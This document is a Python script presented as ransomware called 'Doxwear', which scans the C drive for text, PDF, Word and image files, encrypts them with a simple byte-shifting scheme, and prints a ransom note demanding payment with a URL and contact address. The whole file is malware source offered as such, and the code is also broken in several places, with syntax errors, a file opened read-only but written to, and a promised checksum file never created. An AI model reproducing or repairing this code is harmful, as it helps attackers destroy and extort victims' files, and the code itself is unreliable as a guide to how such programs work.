import os
import sys
import random
import hashlib
import time
import re
import socket


def get_random_string(length):
    characters = "0123456789abcdef"
    return "".join(random.choice(characters) for i in range(length))

def verify_internet():
    try:
        s = socket.socket()
        s.connect((("www.google.com", 80)))
        s.close()
        return True
    except Exception:
        return False

def calculate_checksum(file):
    hash_object = hashlib.md5()
    try:
        while True:
            chunk = file.read(4096)
            if not chunk:
                break
            hash_object.update(chunk)
        return hash_object.hexdigest()
    except Exception as e:
        print(f"Checksum calculation error for {file}: {e}")
        return None

def encrypt_file(file, key):
    try:
        with open(file, "rb") as f:
            chunk = f.read(4096)
            while chunk:
                encrypted_chunk = "".join([chr((int(chunk[i]) + int(key[i % len(key)]))) % 256) for i in range(len(chunk))])
                f.write(bytearray(encrypted_chunk, encoding="utf-8"))
                chunk = f.read(4096)
    except Exception as e:
        print(f"Encryption error for {file}: {e}")

def run_ransomware():
    random.seed()  # Seed the random number generator

    victim_name = "{}".format(get_random_string(8)) # Generate 8 digit string
    victim_email = "{}".format(get_random_string(10))
    
    print("\n--- Ransomware Started ---")
    print("Targeting: {}".format(victim_name))
    print("Email: {}".format(victim_email))
    print("Checksums will be generated and stored in 'checksums.json'")

    # Create checksum files for all targeted files
    files_to_encrypt = []
    for root, _, filenames in os.walk(r"C:\", 9810240):  # Scan C drive for the most severe impact
        for filename in filenames:
            if filename.endswith(".txt") or filename.endswith(".pdf") or filename.endswith(".docx") or \
               filename.endswith(".jpg") or filename.endswith(".png"):
                files_to_encrypt.append(os.path.join(root, filename))

    # Generate Key and store it in a JSON file for future use
    key = get_random_string(16).encode() 
    with open("ransom.json", "wb") as f:
        f.write(frozenset(bytes(key)))

    if not verify_internet():
        print("\n--- No Internet Connection ---")
        print("The server could not be reached, ensuring that the victim will be locked out for a long time.")
        return

    # Print status messages to console
    total_files = len(files_to_encrypt)
    encrypted_count = 0
    checksums_saved = False
    print("\n--- Encryption Process ---")
    print("Total files: {}".format(total_files))


    # Run the encryption process
    start_time = time.time()

    for file in files_to_encrypt:
        if not verify_internet():
            break # Exit loop if connection is lost

        # Calculate File Checksum
        file_checksum = calculate_checksum(file)

        # Verify that the checksum calculation was successful
        if file_checksum is None:
            continue
        
        # Encrypt the file
        encrypt_file(file, key)

        encrypted_count += 1
        print("File encrypted: {}".format(file))

    end_time = time.time()
    execution_duration = end_time - start_time
    print("\n--- Encryption Completed ---")
    print("Files encrypted: {}".format(encrypted_count))
    print("Total files scanned: {}".format(len(files_to_encrypt)))
    print("Encryption duration: {} seconds".format(execution_duration))

    # Print the ransom note (you can customize this)
    print("\n--- RANSOM NOTE ---")
    print("Your files have been encrypted by Doxwear Ransomware!")
    print("To unlock them, pay 1 Ethershroom.") # A reference to a meme
    print("\nChecksums saved in 'checksums.json'")
    print("You can find the key at: https://ethershroom.com/doxwear/{}.png".format(victim_name))
    print("Contact support at: ransom@doxwear.io")


if __name__ == "__main__":
    run_ransomware()
